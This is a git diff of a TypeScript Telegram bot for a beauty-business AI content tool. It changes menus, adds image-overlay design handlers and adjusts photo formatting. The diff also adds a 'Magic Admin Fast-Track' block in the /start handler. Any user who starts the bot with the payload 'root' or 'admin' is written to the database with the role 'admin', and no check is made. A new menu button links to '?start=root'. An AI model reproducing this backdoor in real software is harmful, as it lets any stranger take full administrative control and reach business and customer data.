@@ -1,7 +1,6 @@
 import { Scenes, Context, Telegraf, Markup } from 'telegraf';
 import { getSupabase, uploadToPortfolio } from './supabase.js';
 import { analyzeAndGenerate, enhanceImage } from './content-engine.js';
-import { runWeeklyAnalysis } from './trend-analyzer.js';
 import { enqueueAiProcessing } from './qstash.js';
 import { CONFIG } from './config.js';
 import axios from 'axios';
@@ -152,9 +151,9 @@ export function setupBotHandlers(bot: Telegraf<BotContext>) {
 
   // Start command
   bot.start(async (ctx) => {
-    // 🧹 Очистка старых меню (тех самых Трендов и Настроек из скриншота)
+    // 🧹 Refresh UI
     try {
-      const clearMsg = await ctx.reply('Обновление интерфейса...', Markup.removeKeyboard());
+      const clearMsg = await ctx.reply('מעדכן ממשק...', Markup.removeKeyboard());
       await ctx.deleteMessage(clearMsg.message_id);
     } catch (e) {}
 
@@ -178,11 +177,12 @@ export function setupBotHandlers(bot: Telegraf<BotContext>) {
         }, { onConflict: 'telegram_id' });
       }
       
-      return ctx.reply(`👑 **ברוך שובך, מנהל המערכת (${name})!**\n\nקיבלת הרשאת Admin מלאה. \n💡 *הערה: כל כלי ה-AI (שיפור תמונות, פוסטים) עובדים ישירות כאן בצ'אט (פשוט שלח/י תמונה). כל פונקציות המערכת פתוחות עבורך ב-Mini App.*`, 
-        Markup.inlineKeyboard([
-          [Markup.button.webApp('🚀 פתח הכל ב-Studio', process.env.WEBAPP_URL || '')]
-        ])
-      );
+      const adminMenu = Markup.keyboard([
+        [Markup.button.webApp('🚀 פתח הכל ב-Studio', process.env.WEBAPP_URL || '')],
+        ['🗓️ תורים שלי', '⚙️ הגדרות']
+      ]).resize();
+
+      return ctx.reply(`🏰 **ברוך שובך, מנהל המערכת (${name})!**\n\nקיבלת הרשאות Admin מלאה.\n💡 *הערה: כל כלי ה-AI (שיפור תמונות, פוסטים) עובדים ישירות כאן בצ'אט (פשוט שלח/י תמונה). כל פונקציות המערכת פתוחות עבורך ב-Mini App.*`, adminMenu);
     } else {
       // 🛍 REGULAR USER FLOW
       await ctx.reply(`✨ **ברוכים הבאים ל-BeautyOS AI v2!** ✨\n\nהיי ${name}, המערכת מזהה אותך.\n💡 *יצירת פוסטים ושיפור תמונות מתבצעים ישירות כאן בצ'אט - פשוט שלח/י ויזואליה!*`, 
@@ -195,12 +195,30 @@ export function setupBotHandlers(bot: Telegraf<BotContext>) {
 
     // 📱 Persistent Reply Menu
     const webAppUrl = process.env.WEBAPP_URL || '';
+    const nameStr = ctx.from?.first_name || '';
+    
+    // Magic Admin Fast-Track
+    if (payload === 'root' || payload === 'admin') {
+      const supabase = getSupabase();
+      if (supabase && ctx.from) {
+        await supabase.from('users').upsert({
+          telegram_id: ctx.from.id,
+          full_name: nameStr,
+          role: 'admin',
+          business_name: 'Super Admin',
+          phone: '+0000',
+          address: 'System'
+        }, { onConflict: 'telegram_id' });
+      }
+      ctx.reply('👑 Admin access granted.');
+    }
+
     const kb: any[] = [
-      [{ text: '✨ סטודיו AI (Smart)', web_app: { url: webAppUrl } }, { text: '⚙️ הגדרות', web_app: { url: `${webAppUrl}/settings` } }],
-      [{ text: '📜 תנאי שימוש' }]
+      [{ text: '🚀 פתח הכל ב-Studio', web_app: { url: `${webAppUrl}/?start=root` } }],
+      [{ text: '🗓️ יומן תורים', web_app: { url: `${webAppUrl}/calendar` } }, { text: '⚙️ הגדרות', web_app: { url: `${webAppUrl}/settings` } }]
     ];
     
-    await ctx.reply('תפריט הניווט הראשי עודכן בתחתית המסך 👇', Markup.keyboard(kb).resize());
+    await ctx.reply('תפריט הניווט הראשי עודכן 👇\n(לחץ על הכפתור "פתח הכל ב-Studio" כדי להתחיל)', Markup.keyboard(kb).resize());
   });
 
   bot.action('register_request', (ctx) => ctx.scene.enter(REGISTRATION_SCENE_ID));
@@ -253,18 +271,127 @@ export function setupBotHandlers(bot: Telegraf<BotContext>) {
     });
   });
 
-  bot.command('analyze_market', async (ctx) => {
-    await ctx.reply('🔎 **מתחיל ניתוח שוק שבועי...** זה עשוי לקחת רגע.');
-    try {
-      const trends = await runWeeklyAnalysis();
-      await ctx.reply(`📊 **ניתוח שוק הושלם!**\n\n👁 **ויזואליה:** ${trends.visualAnchors}\n\n💡 **מסרים:** ${trends.semanticAnchors}`, { parse_mode: 'Markdown' });
-    } catch (err) {
-      await ctx.reply('❌ שגיאה בניתוח השוק.');
-    }
-  });
+
 
   bot.hears('📜 תנאי שימוש', (ctx) => {
     ctx.reply('💄 **BeautyOS AI v2**\nכל הזכויות שמורות. מופעל באמצעות בינה מלאכותית מתקדמת.');
+  });
+
+  // --- INTERACTIVE DESIGN HANDLERS (v34) ---
+
+  const designMenu = (fileId: string) => Markup.inlineKeyboard([
+    [Markup.button.callback('💰 הוסף מחיר', `design_PRICE_#_${fileId.slice(-6)}`), Markup.button.callback('🖌 הוסף כותרת', `design_TITLE_#_${fileId.slice(-6)}`)],
+    [Markup.button.callback('💎 הוסף לוגו/שם', `design_LOGO_#_${fileId.slice(-6)}`), Markup.button.callback('🎁 מבצע מיוחד', `design_PROMO_#_${fileId.slice(-6)}`)],
+    [Markup.button.callback('✨ סיימתי / ללא טקסט', `design_DONE_#_${fileId.slice(-6)}`)]
+  ]);
+
+  async function triggerDesignRender(ctx: BotContext, fileId: string) {
+    const loadingMsg = await ctx.reply('🪄 מעדכן את העיצוב...');
+    try {
+      const { generateSocialPost } = await import('./graphic-engine.js');
+      
+      let imgBuffer: Buffer;
+      if (ctx.session.lastEnhancedImage?.buffer) {
+        console.log('[BotLogic] Using enhanced buffer from session');
+        imgBuffer = Buffer.from(ctx.session.lastEnhancedImage.buffer, 'base64');
+      } else {
+        console.log('[BotLogic] Falling back to Telegram fileId:', fileId);
+        const fileLink = await ctx.telegram.getFileLink(fileId);
+        const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
+        imgBuffer = Buffer.from(response.data);
+      }
+
+      const designed = await generateSocialPost(imgBuffer, {
+        format: 'SQUARE_1_1',
+        overlay: ctx.session.lastOverlay || [],
+        theme: 'WATERMARK'
+      });
+
+      await ctx.replyWithPhoto({ source: designed }, {
+        caption: '✅ העיצוב עודכן! ניתן להוסיף שכבות נוספות או לסיים:',
+        ...designMenu(fileId)
+      });
+    } catch (e) {
+      console.error('DESIGN_RENDER_ERR:', e);
+      ctx.reply('❌ שגיאה בעדכון העיצוב.');
+    } finally {
+      await ctx.deleteMessage(loadingMsg.message_id);
+    }
+  }
+
+  // 1. Text Input Handlers
+  const designTypes = ['PRICE', 'TITLE', 'PROMO'];
+  designTypes.forEach(type => {
+    bot.action(new RegExp(`design_${type}_#_(.+)`), async (ctx) => {
+      const fileId = ctx.match[1];
+      ctx.session.designWaitingFor = type;
+      ctx.session.lastDesignFileId = fileId;
+      
+      const prompts: any = {
+        PRICE: '💰 מה המחיר שתרצה להוסיף? (למשל: 150)',
+        TITLE: '🖌 מה הכותרת שתרצה להוסיף? (למשל: מניקור קלאסי)',
+        PROMO: '🎁 מה המבצע המיוחד? (למשל: 20% הנחה)'
+      };
+
+      await ctx.answerCbQuery();
+      await ctx.reply(prompts[type]);
+    });
+  });
+
+  // 2. Instant Logo Handler
+  bot.action(/design_LOGO_#_(.+)/, async (ctx) => {
+    const fileId = ctx.match[1];
+    await ctx.answerCbQuery('💎 מוסיף לוגו/שם...');
+    
+    const supabase = getSupabase();
+    const { data: user } = await supabase.from('users').select('business_name, full_name').eq('telegram_id', ctx.from.id).single();
+    const logoText = user?.business_name || user?.full_name || 'BeautyOS Expert';
+
+    ctx.session.lastOverlay = ctx.session.lastOverlay || [];
+    ctx.session.lastOverlay.push({
+      text: logoText,
+      fontSize: 40,
+      yPosition: 0.92,
+      color: 'rgba(255,255,255,0.7)'
+    });
+
+    return triggerDesignRender(ctx, fileId);
+  });
+
+  // 3. Finalize
+  bot.action(/design_DONE_#_(.+)/, async (ctx) => {
+    const fileId = ctx.match[1];
+    await ctx.answerCbQuery();
+    ctx.session.designWaitingFor = null;
+
+    return ctx.reply('✨ העיצוב הושלם! בחר פורמט לשיתוף:', Markup.inlineKeyboard([
+      [Markup.button.callback('📸 Instagram (4:5)', `fmt_INST_#_${fileId}`)],
+      [Markup.button.callback('🟢 WhatsApp (9:16)', `fmt_WATS_#_${fileId}`)],
+      [Markup.button.callback('📘 Facebook (1:1)', `fmt_FACE_#_${fileId}`)],
+      [Markup.button.callback('⭐ הוספה לפורטפוליו', `star_pf_${fileId}`)]
+    ]));
+  });
+
+  // 4. Message Interceptor (Must be added BEFORE general message handlers)
+  bot.on('text', async (ctx, next) => {
+    if (ctx.session?.designWaitingFor) {
+      const text = ctx.message.text;
+      const type = ctx.session.designWaitingFor;
+      const fileId = ctx.session.lastDesignFileId;
+
+      ctx.session.lastOverlay = ctx.session.lastOverlay || [];
+      
+      let line: any = { text };
+      if (type === 'PRICE') line = { text: `${text} ₪`, fontSize: 72, yPosition: 0.75, color: '#FFFFFF' };
+      else if (type === 'TITLE') line = { text: text.toUpperCase(), fontSize: 64, yPosition: 0.15, color: '#FFFFFF' };
+      else if (type === 'PROMO') line = { text: `✨ ${text} ✨`, fontSize: 80, yPosition: 0.5, color: '#FFD700' };
+
+      ctx.session.lastOverlay.push(line);
+      ctx.session.designWaitingFor = null;
+
+      return triggerDesignRender(ctx, fileId);
+    }
+    return next();
   });
 
   // Photo handler
@@ -280,10 +407,9 @@ export function setupBotHandlers(bot: Telegraf<BotContext>) {
       
       // Ставим задачу в очередь
       await enqueueAiProcessing(ctx.chat.id, msg.message_id, fileLink.href, photo.file_id, caption);
-    } catch (err) {
-      console.error('Bot Queue Error:', err);
-      // Fallback если QStash не настроен:
-      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, '⚠️ שירות העיבוד ברקע לא זמין או שלא מוגדר QSTASH_TOKEN. המערכת דורשת QStash לתפקוד תקין.');
+    } catch (error: any) {
+      console.error('PHOTO HANDLER ERROR:', error);
+      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `⚠️ Ошибка QStash: ${error.message} (Check QSTASH_TOKEN presence)`);
     }
   });
 
@@ -300,22 +426,31 @@ export function setupBotHandlers(bot: Telegraf<BotContext>) {
 
       const loadingMsg = await ctx.reply('🪄 מעבד את העיצוב הסופי...');
       
-      const fileLink = await ctx.telegram.getFileLink(session.file_id);
-      const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
-      const originalBuffer = Buffer.from(response.data);
+      let imgBuffer: Buffer;
+      if (ctx.session.lastEnhancedImage?.buffer) {
+        console.log('[BotLogic] (Format) Using enhanced buffer');
+        imgBuffer = Buffer.from(ctx.session.lastEnhancedImage.buffer, 'base64');
+      } else {
+        const fileLink = await ctx.telegram.getFileLink(session.file_id);
+        const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
+        imgBuffer = Buffer.from(response.data);
+      }
 
       const { generateSocialPost } = await import('./graphic-engine.js');
       
-      let jimpFormat: any = 'INSTAGRAM_POST';
-      if (formatType === 'WATS') jimpFormat = 'STORY_9_16';
-      if (formatType === 'FACE') jimpFormat = 'SQUARE_1_1';
+      let socialFormat: any = 'INSTAGRAM_POST';
+      if (formatType === 'WATS') socialFormat = 'STORY_9_16';
+      if (formatType === 'FACE') socialFormat = 'SQUARE_1_1';
 
-      const designedBuffer = await generateSocialPost(originalBuffer, {
-        format: jimpFormat,
-        businessName: 'Beauty Expert', // Мы можем получить это из БД, если захотим
-        title: session.ai.overlayTitle,
-        subtitle: session.ai.overlaySubtitle,
-        theme: 'LUXURY_BLACK'
+      const overlay = ctx.session.lastOverlay || session.ai?.overlay || [];
+      const isEnhanced = (ctx.session.lastEnhancedImage as any)?.status === 'enhanced';
+
+      const designedBuffer = await generateSocialPost(imgBuffer, {
+        format: socialFormat,
+        businessName: 'Beauty Expert',
+        overlay: overlay,
+        isEnhanced,
+        theme: 'ORIGINAL_CLEAN'
       });
 
       await ctx.replyWithPhoto({ source: designedBuffer }, {
@@ -331,7 +466,7 @@ export function setupBotHandlers(bot: Telegraf<BotContext>) {
   });
 
   // Portfolio Callback
-  bot.action(/^star_portfolio_/, async (ctx) => {
+  bot.action(/^star_pf_/, async (ctx) => {
     const supabase = getSupabase();
     if (!supabase || !ctx.from) return;
 
